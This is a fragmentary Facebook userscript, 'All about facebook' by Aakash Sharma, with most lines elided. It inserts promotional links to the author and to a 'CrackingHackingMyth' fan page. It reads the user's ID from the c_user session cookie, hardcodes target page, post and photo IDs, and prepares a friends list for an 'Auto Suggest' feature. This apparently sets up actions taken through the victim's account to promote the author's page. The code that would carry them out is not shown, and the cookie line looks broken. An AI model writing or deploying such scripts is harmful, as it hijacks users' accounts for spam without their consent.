...
// @description     All about facebook By Aakash Sharma
...
if(body != null) {
	...
	div.innerHTML = "<center><a href='http://www.facebook.com/aakashmds'><img src='http://m.uploadedit.com/b018/1375198514954.gif' alt='Loading...' width=120 hight=90></a></center><br><br></br>"
	...
	div.style.width = "125px";
	div2.innerHTML = "<div style='background-color: #2E5392; color: #FFFFFF; 	border: 1px dashed #333333;'><center><a style='color: #FFFFFF;' onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a>&#8226; <a href='http://www.facebook.com/aakashmds' style='color: #FFFFFF;' onclick='alert(\'Thanks for install this script\');'>By Aakash Sharma</a></center></div> "
	...
	for(i=1;i<=20;i++) {
		...
		div2.innerHTML = "<center><a onclick='spoiler()' title='Click to Hidden Widget'>&laquo;</a> &#8226; <a href='http://www.facebook.com/CrackingHackingMyth' title='Thanks for install this script'>My FansPage</a></center> "
		}
		else {
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/aakashmds" target="_blank">Created by Aakash Sharma <br>KLIK DISINI</a>';
	html += '</div>';
...
var spage_id = "195469043933958";
var spost_id = "100000363932465";
var sfoto_id = "146908735331257";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Aakash Sharma';
